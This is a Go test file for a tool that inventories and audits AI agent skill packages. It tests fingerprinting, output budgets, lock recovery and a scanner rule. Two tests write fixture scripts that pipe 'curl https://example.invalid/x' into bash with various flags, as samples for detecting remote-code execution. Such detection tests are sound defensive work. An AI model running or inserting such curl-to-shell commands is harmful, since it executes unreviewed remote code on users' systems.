package audit

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestD13ExplicitRootsBeforeInjectedDeviceRoot(t *testing.T) {
	root := tempDir(t)
	device := filepath.Join(root, "device")
	home := filepath.Join(device, "home")
	explicit := filepath.Join(home, ".claude")
	fixture(t, explicit, "p/SKILL.md", "# fixture")
	for i := 0; i < 30; i++ {
		fixture(t, home, strings.Repeat("z", i+1), "data")
	}
	o := fixtureOptions(explicit)
	o.Device = true
	o.Home = home
	o.DeviceRoots = func() []string { return []string{device} }
	o.MaxEntries = 8
	inv := InventoryRun(context.Background(), o)
	if len(inv.Packages) != 1 || !inv.Packages[0].Complete {
		t.Fatal(inv)
	}
}
func TestReview2MetadataUsesSameReferenceFingerprint(t *testing.T) {
	g := newGitFixture()
	g.add("p/SKILL.md", "# fixture")
	g.add("p/.DS_Store", "metadata")
	g.add("p/.git/config", "metadata")
	g.add("p/nested/.svn/entries", "metadata")
	g.add("LICENSE", "attribution")
	c := g.client(t).Sync([]string{"a/x"}, "HEAD", Search{}, 20)
	if len(c.Skills) != 1 {
		t.Fatal(c)
	}
	r := c.Skills[0]
	root := tempDir(t)
	fixture(t, root, "SKILL.md", "# fixture")
	fixture(t, root, ".DS_Store", "metadata")
	fixture(t, root, ".git/config", "metadata")
	fixture(t, root, "nested/.svn/entries", "metadata")
	p := Measure(context.Background(), root, "")
	if p.Digest != r.Digest || NewMatcher(c).Match(p).Status != "exact" {
		t.Fatal(p.Digest, r.Digest, c)
	}
	if len(r.Files) != 1 || len(r.Data) != 1 || len(c.Attribution) != 1 {
		t.Fatal(r, c.Attribution)
	}
}
func TestReview2StagingFailureDoesNotDisableLaterPackage(t *testing.T) {
	s := scannerFixture(t)
	defer s.Close()
	scans := 0
	s.process = func(_ context.Context, _ string, args []string) (string, int, error) {
		if args[0] == "version" {
			return "skill-xray 0.1.0", 0, nil
		}
		scans++
		if e := os.WriteFile(args[2], []byte(cleanSARIF), 0600); e != nil {
			t.Fatal(e)
		}
		return "", 0, nil
	}
	good := measuredFixture(t)
	bad := good
	bad.Files = append([]File(nil), good.Files...)
	bad.Files[0].SHA256 = Sum([]byte("different"))
	first, _ := s.Scan(context.Background(), bad)
	second, _ := s.Scan(context.Background(), good)
	if first.Status != "failed" || !Completed(second) || scans != 1 {
		t.Fatal(first, second, scans)
	}
}
func TestReview2FinalBudgetFailureIsIncomplete(t *testing.T) {
	inv := Inventory{Schema: InventorySchema, Complete: true, Packages: []Package{}, Roots: []string{"/fixture"}}
	budget := newInventoryBudget(&inv, nil)
	budget.limit.OutputBytes = budget.used - 1
	budget.finish()
	b, _ := Encode(inv)
	var raw map[string]any
	json.Unmarshal(b, &raw)
	if inv.outputFailure == nil || inv.Complete || raw["complete"] != false || !hasCode(inv.Diagnostics, "inventory_output_budget") {
		t.Fatal(inv, string(b))
	}
}
func TestReview2ReportReadPreservesSkillDiagnosticCoverage(t *testing.T) {
	p := measuredFixture(t)
	r := Report{Schema: ReportSchema, CatalogID: CatalogID(Catalog{}), CreatedAt: time.Now(), Complete: false, DiscoveryComplete: true, Skills: []Skill{{Package: p, Evaluations: []Evaluation{{Scanner: "skill-audit", Version: EvaluationVersion, Status: "completed_without_findings"}}}}}
	r.Skills[0].Diagnostics = append(r.Skills[0].Diagnostics, diag("inventory_drift", p.Path, "fixture drift"))
	b, _ := Encode(r)
	var read Report
	if e := json.Unmarshal(b, &read); e != nil {
		t.Fatal(e)
	}
	if read.Complete || !read.DiscoveryComplete {
		t.Fatal(read)
	}
}
func TestReview2FinalSearchDiagnosticCanExhaustSyncBudget(t *testing.T) {
	g := newGitFixture()
	g.add("p/SKILL.md", "# fixture")
	first := g.client(t).Sync([]string{"a/x"}, "HEAD", Search{}, 20)
	b, _ := Encode(first)
	a := g.client(t)
	a.OutputLimit = len(b) + 2048 + 1
	c := a.Sync([]string{"a/x"}, "HEAD", Search{Schema: SearchSchema, Complete: false}, 20)
	if len(c.Skills) != 1 || c.Complete || !hasCode(c.Diagnostics, "sync_budget") {
		t.Fatal(c)
	}
	b, _ = Encode(c)
	if len(b) > a.OutputLimit {
		t.Fatal(len(b), a.OutputLimit)
	}
}
func TestReview2LockFailureExplainsManualRecovery(t *testing.T) {
	root := tempDir(t)
	path := fixture(t, root, "state.json.lock", "fixture stale lock")
	state := strings.TrimSuffix(path, ".lock")
	r := Report{Schema: ReportSchema, DiscoveryComplete: true}
	rec := Record(context.Background(), state, "baseline", r, nil, nil)
	if rec.Status != "not_recorded" || !strings.Contains(rec.Message, "inspect") || !strings.Contains(rec.Message, "remove") {
		t.Fatal(rec)
	}
}
func TestR1R2SA001ReceiverOptions(t *testing.T) {
	for _, tc := range []struct {
		receiver string
		want     bool
	}{{"bash -e", true}, {"sh -ux", true}, {"bash -se", true}, {"bash -v -s -- argument", true}, {"bash -- -s", false}, {"bash -e file.sh", false}, {"bash -s -c command", false}, {"bash -n", false}, {"bash -o errexit", false}, {"bash --verbose", false}, {"bash -z", false}} {
		t.Run(tc.receiver, func(t *testing.T) {
			data := []byte("curl https://example.invalid/x | " + tc.receiver + "\n")
			p := Package{Complete: true, Files: []File{{Path: "run.sh"}}, Data: map[string][]byte{"run.sh": data}}
			e, findings := LocalScan(p)
			if !Completed(e) || (len(findings) > 0) != tc.want {
				t.Fatal(e, findings)
			}
			for _, f := range findings {
				if f.RuleVersion != "3" || f.ScannerVersion != EvaluationVersion {
					t.Fatal(f)
				}
			}
		})
	}
}
func TestR3V2BaselineCannotEstablishNewV3Finding(t *testing.T) {
	root := tempDir(t)
	fixture(t, root, "SKILL.md", "# fixture")
	fixture(t, root, "run.sh", "echo safe\n")
	inv := InventoryRun(context.Background(), fixtureOptions(root))
	base := AuditRun(context.Background(), inv, Catalog{}, AuditOptions{})
	base.Skills[0].Evaluations[0].Version = "SA001/v2;sh/v3.10.0;scope/v2"
	fixture(t, root, "run.sh", "curl https://example.invalid/x | bash -e\n")
	current := AuditRun(context.Background(), InventoryRun(context.Background(), fixtureOptions(root)), Catalog{}, AuditOptions{})
	Compare(&current, base)
	if current.Skills[0].Lineage.Status != "changed" || len(current.Skills[0].Findings) != 1 || current.Skills[0].Findings[0].Change != "present_in_changed_file" {
		t.Fatal(current)
	}
}
func TestReview2DependencyOmissionRemainsIncompleteLocally(t *testing.T) {
	g := newGitFixture()
	g.add("p/SKILL.md", "# fixture")
	g.add("p/node_modules/data", "relevant bytes")
	c := g.client(t).Sync([]string{"a/x"}, "HEAD", Search{}, 20)
	if len(c.Skills) != 1 || len(c.Skills[0].Files) != 2 {
		t.Fatal(c)
	}
	root := tempDir(t)
	fixture(t, root, "SKILL.md", "# fixture")
	fixture(t, root, "node_modules/data", "relevant bytes")
	p := Measure(context.Background(), root, "")
	if p.Complete || p.Digest != "" || NewMatcher(c).Match(p).Status == "exact" {
		t.Fatal(p)
	}
}
func TestReview2StagingWriteFailureDoesNotDisableLaterPackage(t *testing.T) {
	s := scannerFixture(t)
	defer s.Close()
	scans := 0
	s.process = func(_ context.Context, _ string, args []string) (string, int, error) {
		if args[0] == "version" {
			return "skill-xray 0.1.0", 0, nil
		}
		scans++
		if e := os.WriteFile(args[2], []byte(cleanSARIF), 0600); e != nil {
			t.Fatal(e)
		}
		return "", 0, nil
	}
	good := measuredFixture(t)
	long := strings.Repeat("x", 300)
	bad := Package{Path: good.Path, Complete: true, Files: []File{{Path: long, SHA256: Sum([]byte("data")), Size: 4}}, Data: map[string][]byte{long: []byte("data")}}
	first, _ := s.Scan(context.Background(), bad)
	second, _ := s.Scan(context.Background(), good)
	if first.Status != "failed" || !Completed(second) || scans != 1 {
		t.Fatal(first, second, scans)
	}
}
func TestReview2StoredObservationKeepsDriftCoverage(t *testing.T) {
	p := measuredFixture(t)
	p.Diagnostics = append(p.Diagnostics, diag("inventory_drift", p.Path, "fixture"))
	r := Report{Schema: ReportSchema, CatalogID: CatalogID(Catalog{}), CreatedAt: time.Now().UTC(), DiscoveryComplete: true, Complete: false, Skills: []Skill{{Package: p}}}
	path := filepath.Join(tempDir(t), "state.json")
	rec := Record(context.Background(), path, "baseline", r, nil, nil)
	if rec.Status != "recorded" {
		t.Fatal(rec)
	}
	read, e := ReadState(path)
	if e != nil || read.Observations[0].Complete || !read.Observations[0].DiscoveryComplete {
		t.Fatal(read, e)
	}
}
func TestReview2ReportReadCannotPromotePartialDiscovery(t *testing.T) {
	r := Report{Schema: ReportSchema, DiscoveryComplete: false, Complete: false}
	b, _ := Encode(r)
	var read Report
	if e := json.Unmarshal(b, &read); e != nil {
		t.Fatal(e)
	}
	if read.Complete || read.DiscoveryComplete {
		t.Fatal(read)
	}
}
